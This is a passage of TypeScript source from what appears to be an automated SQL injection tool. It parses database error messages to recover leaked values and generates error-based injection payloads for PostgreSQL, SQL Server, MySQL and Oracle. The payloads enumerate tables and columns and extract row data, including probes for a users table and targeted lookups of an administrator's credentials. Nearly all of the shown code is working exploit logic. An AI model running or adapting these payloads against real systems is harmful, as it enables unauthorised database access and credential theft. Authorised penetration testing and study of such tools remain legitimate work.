                    responseBody.match(/invalid input syntax for (?:type\s+)?(?:integer|int|numeric):\s*(?:&quot;|&#34;)([^&]+)(?:&quot;|&#34;)/i) ||
                    responseBody.match(/invalid input syntax for (?:type\s+)?(?:integer|int|numeric):\s*&#39;([^&]+)&#39;/i);
    if (pgMatch && pgMatch[1]) {
      const val = MetadataExtractor.decodeHtmlEntities(pgMatch[1]).trim();
      if (val && !val.toLowerCase().includes('select') && !val.includes('CAST(')) {
        return val;
      }
    }

    // 2. Microsoft SQL Server conversion error
    // e.g. Conversion failed when converting the varchar value 'administrator' to data type int.
    const mssqlMatch = responseBody.match(/Conversion failed when converting the (?:varchar|nvarchar|char|nchar) value\s+['"]([^'"\r\n<]+)['"]\s+to data type/i) ||
                       responseBody.match(/converting the (?:varchar|nvarchar) value\s+(?:&quot;|&#39;|&#34;)([^&]+)(?:&quot;|&#39;|&#34;)\s+to/i);
    if (mssqlMatch && mssqlMatch[1]) {
      const val = MetadataExtractor.decodeHtmlEntities(mssqlMatch[1]).trim();
      if (val) return val;
    }

    // 3. MySQL ExtractValue / UpdateXML / Duplicate key error
    // e.g. XPATH syntax error: '~administrator'
    const myMatch = responseBody.match(/XPATH syntax error:\s*['"]~?([^'"\r\n<]+)['"]/i) ||
                    responseBody.match(/Duplicate entry\s+['"]~?([^'"\r\n<]+)['"]\s+for key/i);
    if (myMatch && myMatch[1]) {
      const val = MetadataExtractor.decodeHtmlEntities(myMatch[1]).replace(/^~/, '').trim();
      if (val) return val;
    }

    // 4. Oracle DRITHSX / utl_inaddr / XMLType / invalid number error
    const oraMatch = responseBody.match(/ORA-20000:\s*Oracle Text error:.*?['"]([^'"\r\n<]+)['"]/i) ||
                     responseBody.match(/ORA-01722:\s*invalid number(?:\s*-\s*["']?([^"'\r\n<]+)["']?)?/i) ||
                     responseBody.match(/ORA-29257:\s*host\s+([^"'\r\n<]+)\s+unknown/i);
    if (oraMatch && oraMatch[1]) {
      const val = MetadataExtractor.decodeHtmlEntities(oraMatch[1]).trim();
      if (val) return val;
    }

    return undefined;
  }

  /**
   * Generates error-based CAST / CONVERT table discovery queries.
   * Includes ultra-compact queries (< 60-80 chars) to survive backend buffer and cookie length limits.
   */
  public static getErrorBasedTableQueries(
    _param: CandidateParameter,
    offset: number,
    dbms: DbmsType,
    clearPrefix: boolean = true
  ): string[] {
    const p = clearPrefix ? "'" : "original'";
    const queries: string[] = [];

    if (dbms === 'PostgreSQL' || dbms === 'Generic SQL' || dbms === 'Unknown') {
      // 1. Ultra-compact queries (under 80 chars)
      if (offset === 0) {
        queries.push(`${p} AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--`);
        // Direct probes for common high-value application tables
        queries.push(`${p} AND 1=CAST((SELECT 1 FROM users LIMIT 1) AS int)--`);
      }
      queries.push(`${p} AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET ${offset}) AS int)--`);
      // 2. Standard queries with schema filter
      queries.push(`${p} AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' OFFSET ${offset} LIMIT 1) AS int)--`);
      queries.push(`${p} AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' OFFSET ${offset} LIMIT 1) AS int) AND '1'='1`);
    }

    if (dbms === 'Microsoft SQL Server' || dbms === 'Generic SQL' || dbms === 'Unknown') {
      queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM (SELECT TOP ${offset + 1} table_name FROM information_schema.tables ORDER BY table_name ASC) t ORDER BY table_name DESC))--`);
      if (offset === 0) {
        queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--`);
        queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 name FROM sys.tables))--`);
      }
    }

    if (dbms === 'MySQL' || dbms === 'MariaDB' || dbms === 'Generic SQL' || dbms === 'Unknown') {
      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT ${offset},1)))-- -`);
      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT ${offset},1)))-- -`);
    }

    if (dbms === 'Oracle') {
      queries.push(`${p} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM (SELECT table_name, ROWNUM r FROM user_tables) WHERE r=${offset + 1}))--`);
      if (offset === 0) {
        queries.push(`${p} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM user_tables WHERE ROWNUM=1))--`);
      }
    }

    return queries;
  }

  /**
   * Generates error-based CAST / CONVERT column enumeration queries
   */
  public static getErrorBasedColumnQueries(
    _param: CandidateParameter,
    tableName: string,
    offset: number,
    dbms: DbmsType,
    clearPrefix: boolean = true
  ): string[] {
    const p = clearPrefix ? "'" : "original'";
    const cleanTable = MetadataExtractor.decodeHtmlEntities(tableName).replace(/['"]/g, '');
    const queries: string[] = [];

    if (dbms === 'PostgreSQL' || dbms === 'Generic SQL' || dbms === 'Unknown') {
      // Ultra-compact column enumeration
      queries.push(`${p} AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable}' LIMIT 1 OFFSET ${offset}) AS int)--`);
      queries.push(`${p} AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable.toLowerCase()}' LIMIT 1 OFFSET ${offset}) AS int)--`);
      queries.push(`${p} AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable}' OFFSET ${offset} LIMIT 1) AS int)--`);
      queries.push(`${p} AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable}' OFFSET ${offset} LIMIT 1) AS int) AND '1'='1`);
    }

    if (dbms === 'Microsoft SQL Server' || dbms === 'Generic SQL' || dbms === 'Unknown') {
      queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 column_name FROM (SELECT TOP ${offset + 1} column_name FROM information_schema.columns WHERE table_name='${cleanTable}' ORDER BY column_name ASC) t ORDER BY column_name DESC))--`);
    }

    if (dbms === 'MySQL' || dbms === 'MariaDB' || dbms === 'Generic SQL' || dbms === 'Unknown') {
      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_name='${cleanTable}' LIMIT ${offset},1)))-- -`);
    }

    if (dbms === 'Oracle') {
      queries.push(`${p} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT column_name FROM (SELECT column_name, ROWNUM r FROM all_tab_columns WHERE table_name=UPPER('${cleanTable}')) WHERE r=${offset + 1}))--`);
    }

    return queries;
  }

  /**
   * Generates error-based CAST / CONVERT row value extraction queries
   */
  public static getErrorBasedRowQueries(
    _param: CandidateParameter,
    tableName: string,
    columnName: string,
    offset: number,
    dbms: DbmsType,
    clearPrefix: boolean = true,
    whereClause?: string
  ): string[] {
    const p = clearPrefix ? "'" : "original'";
    const cleanTable = MetadataExtractor.decodeHtmlEntities(tableName).replace(/['"]/g, '');
    const cleanCol = MetadataExtractor.decodeHtmlEntities(columnName).replace(/['"]/g, '');
    const queries: string[] = [];

    if (dbms === 'PostgreSQL' || dbms === 'Generic SQL' || dbms === 'Unknown') {
      if (whereClause) {
        // Ultra-compact targeted queries (e.g. username='administrator')
        queries.push(`${p} AND 1=CAST((SELECT ${cleanCol} FROM ${cleanTable} WHERE ${whereClause} LIMIT 1) AS int)--`);
        queries.push(`${p} AND 1=CAST((SELECT ${cleanCol}::text FROM ${cleanTable} WHERE ${whereClause} LIMIT 1) AS int)--`);
      }
      queries.push(`${p} AND 1=CAST((SELECT ${cleanCol} FROM ${cleanTable} LIMIT 1 OFFSET ${offset}) AS int)--`);
      queries.push(`${p} AND 1=CAST((SELECT ${cleanCol} FROM ${cleanTable} OFFSET ${offset} LIMIT 1) AS int)--`);
      queries.push(`${p} AND 1=CAST((SELECT ${cleanCol}::text FROM ${cleanTable} OFFSET ${offset} LIMIT 1) AS int)--`);
      queries.push(`${p} AND 1=CAST((SELECT ${cleanCol} FROM ${cleanTable} OFFSET ${offset} LIMIT 1) AS int) AND '1'='1`);
    }

    if (dbms === 'Microsoft SQL Server' || dbms === 'Generic SQL' || dbms === 'Unknown') {
      if (whereClause) {
        queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 ${cleanCol} FROM ${cleanTable} WHERE ${whereClause}))--`);
      }
      queries.push(`${p} AND 1=CONVERT(int, (SELECT TOP 1 ${cleanCol} FROM (SELECT TOP ${offset + 1} ${cleanCol} FROM ${cleanTable} ORDER BY 1 ASC) t ORDER BY 1 DESC))--`);
    }

    if (dbms === 'MySQL' || dbms === 'MariaDB' || dbms === 'Generic SQL' || dbms === 'Unknown') {
      if (whereClause) {
        queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ${cleanCol} FROM ${cleanTable} WHERE ${whereClause} LIMIT 1)))-- -`);
      }
      queries.push(`${p} AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ${cleanCol} FROM ${cleanTable} LIMIT ${offset},1)))-- -`);
    }

    if (dbms === 'Oracle') {
      if (whereClause) {
        queries.push(`${p} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT ${cleanCol} FROM ${cleanTable} WHERE ${whereClause} AND ROWNUM=1))--`);
      }
      queries.push(`${p} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT ${cleanCol} FROM (SELECT ${cleanCol}, ROWNUM r FROM ${cleanTable}) WHERE r=${offset + 1}))--`);
    }

    return queries;
  }
}

